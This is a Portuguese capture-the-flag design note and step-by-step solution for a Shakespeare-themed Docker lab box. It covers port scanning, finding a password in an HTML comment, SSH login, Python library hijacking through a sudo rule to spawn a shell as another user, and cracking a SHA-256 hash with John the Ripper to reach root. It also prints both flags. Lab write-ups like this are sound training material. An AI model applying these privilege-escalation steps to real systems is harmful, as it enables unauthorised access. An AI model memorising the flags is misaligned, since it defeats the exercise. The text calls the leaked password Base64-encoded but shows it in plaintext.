
# 1. Descrição Detalhada das Vulnerabilidades Implementadas

## 1.1 Exposição de Diretório Oculto e Comentário no Código-Fonte (CWE-200 / CWE-615)
* **Vetor:** O servidor web Nginx expõe na porta 8080 o diretório `/archive`. Essa rota consta nas listas comuns de força bruta de diretórios (`common.txt`).
* **Mecanismo:** Dentro de `/archive`, o  código-fonte HTML do arquivo `index.html` contém a senha codificada em Base64 nos comentários`(To_Be_Or_Not_To_Be_1603`. Além disso, o arquivo `/archive/hamlet.txt` cita a tragédia do Príncipe da Dinamarca. O atacante relaciona o tema à conta do sistema operacional e utiliza o usuário `hamlet` com a senha descoberta para autenticar no serviço OpenSSH (porta 2222).

## 1.2 Movimento Lateral via Python Library Hijacking (CWE-427 / Uncontrolled Search Path)
* **Vetor:** O usuário `hamlet` possui a seguinte entrada no `/etc/sudoers.d/hamlet`:
  ```text
  hamlet ALL=(othello) NOPASSWD: /usr/bin/python3 /opt/scripts/theater.py
  ```
* **Mecanismo:** O script `/opt/scripts/theater.py` pertence a `othello` e insere o diretório de trabalho atual na prioridade de busca do Python (`sys.path.insert(0, os.getcwd())`) para tentar importar o módulo local `desdemona`:
  ```python
  import sys, os
  sys.path.insert(0, os.getcwd())
  import desdemona
  desdemona.verificar_fidelidade()
  ```
  O invasor posiciona-se em um diretório com permissão de escrita (`/tmp` ou `/home/hamlet`), cria um arquivo malicioso denominado `desdemona.py` contendo a chamada para um shell (`pty.spawn("/bin/bash")`) e dispara o comando com `sudo -u othello`. Ao executar, o script carrega o arquivo do invasor com privilégios de `othello`.

## 1.3 Uso de Senha Fraca e Quebra de Hash SHA-256 (CWE-326 / CWE-521)
* **Vetor:** No diretório do usuário `othello`, o arquivo `recado_de_iago.txt` armazena a mensagem:
  ```text
  Otelo, a lealdade da corte foi maculada. O segredo da coroa esta guardado sob a assinatura: 31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205
  ```
* **Mecanismo:** A assinatura corresponde ao hash SHA-256 da palavra `desdemona`. Sendo uma palavra comum e histórica presente logo nas primeiras linhas da lista `rockyou.txt`, o atacante quebra o hash em menos de 2 segundos com ferramentas como John the Ripper ou Hashcat. A senha resultante desbloqueia a conta `root` via utilitário `su`.

---

# 2. Walkthrough Técnico Completo (Solução Passo a Passo)

## Etapa 1: Reconhecimento e Varredura de Rede
O atacante executa um port scan no alvo para mapear portas abertas:

```bash
nmap -sV -sC -p- 127.0.0.1 -p 8080,2222
```

**Saída esperada:**
* `8080/tcp open http nginx/1.22.1`
* `2222/tcp open ssh OpenSSH 9.2p1`

---

## Etapa 2: Enumeração Web e Obtenção de Credenciais
Ao acessar `http://127.0.0.1:8080`, o atacante visualiza a página inicial com o crânio de Yorick e o solilóquio *"To be, or not to be"*.

Execução de enumeração de diretórios com o `gobuster`:
```bash
gobuster dir -u http://127.0.0.1:8080 -w /usr/share/wordlists/dirb/common.txt
```

O `gobuster` identifica a rota `/archive` (Status 301/200).  
Acessando `http://127.0.0.1:8080/archive/`:
1. O atacante visualiza o link para `hamlet.txt`. Ao abri-lo, lê trechos da tragédia de Hamlet, inferindo a conta de usuário `hamlet`.
2. O atacante inspeciona o código-fonte da página (`Ctrl+U` ou via `curl`):
   ```bash
   curl -s http://127.0.0.1:8080/archive/ | grep "Senha"
   ```
   **Resultado:**
   ```html
   <!-- Senha de acesso: To_Be_Or_Not_To_Be_1603 -->
   ```

---

## Etapa 3: Acesso Inicial (Sessão SSH como Hamlet)
Com o usuário `hamlet` e a senha `To_Be_Or_Not_To_Be_1603`, o atacante conecta ao serviço SSH exposto na porta 2222:

```bash
ssh hamlet@127.0.0.1 -p 2222
```

O atacante obtém com sucesso uma sessão shell unprivileged:
```text
hamlet@the-globe-theater:~$ id
uid=1000(hamlet) gid=1000(hamlet) groups=1000(hamlet)
```

---

## Etapa 4: Movimentação Lateral para Othello (User Flag)
O atacante inicia a enumeração de privilégios locais consultando as regras de sudo:

```bash
sudo -l
```

**Saída:**
```text
Matching Defaults entries for hamlet on the-globe-theater:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hamlet may run the following commands on the-globe-theater:
    (othello) NOPASSWD: /usr/bin/python3 /opt/scripts/theater.py
```

O atacante inspeciona o código de `/opt/scripts/theater.py`:
```bash
cat /opt/scripts/theater.py
```

Identifica a tentativa de carregar o módulo inexistente `desdemona`. Para explorar a vulnerabilidade de *Python Library Hijacking*, o atacante cria uma biblioteca maliciosa em `/tmp`:

```bash
cd /tmp
cat << 'EOF' > desdemona.py
import pty, os
def verificar_fidelidade():
    pty.spawn("/bin/bash")
EOF
```

Em seguida, executa o comando autorizado a partir de `/tmp`:
```bash
sudo -u othello /usr/bin/python3 /opt/scripts/theater.py
```

O payload é importado e executado, concedendo acesso à conta `othello`:
```text
othello@the-globe-theater:/tmp$ id
uid=1001(othello) gid=1001(othello) groups=1001(othello)
```

**Captura da User Flag:**
```bash
cat /home/othello/user.txt
```
**Flag:** `TAC{h4ml3t_m33ts_0th3ll0_1603}`

---

## Etapa 5: Escalação de Privilégios para Root (Root Flag)
Ainda no diretório de `othello`, o atacante identifica a pista deixada por Iago:

```bash
cat /home/othello/recado_de_iago.txt
```

**Conteúdo:**
```text
Otelo, a lealdade da corte foi maculada. O segredo da coroa esta guardado sob a assinatura: 31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205
```

O atacante salva o hash em um arquivo local e realiza a quebra utilizando o John the Ripper com a lista `rockyou.txt`:

```bash
echo "31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205" > hash.txt
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Resultado:**
```text
desdemona        (31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205)
```

Com a senha `desdemona`, o invasor troca para o usuário `root`:
```bash
su -
# Digite a senha: desdemona
```

Confirmando o acesso root:
```text
root@the-globe-theater:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Captura da Root Flag:**
```bash
cat /root/root.txt
```
**Flag:** `TAC{th3_r3st_1s_s1l3nc3_sh4k3sp34r3}`

---

# 3. Verificação do Código de Conduta e Segurança

1. **Isolamento de Container:**
   * O arquivo `docker-compose.yml` e o `docker-compose-dist.yml` **não** possuem `privileged: true`.
   * **Nenhum** socket do Docker (`/var/run/docker.sock`) é compartilhado com o container.
   * **Nenhum** diretório do host é montado em tempo de execução.
   * Não se utiliza `network_mode: host`.
2. **Ausência de Código Malicioso:**
   * O container utiliza apenas softwares e daemons padrão dos repositórios oficiais Debian (`nginx`, `openssh-server`, `python3`, `supervisor`, `sudo`).
   * Não há chamadas externas ou necessidade de conexão de internet durante a execução do CTF.
3. **Reprodutibilidade Estrita:**
   * O ambiente sobe em estado funcional de forma atômica através do comando `docker compose up -d`.
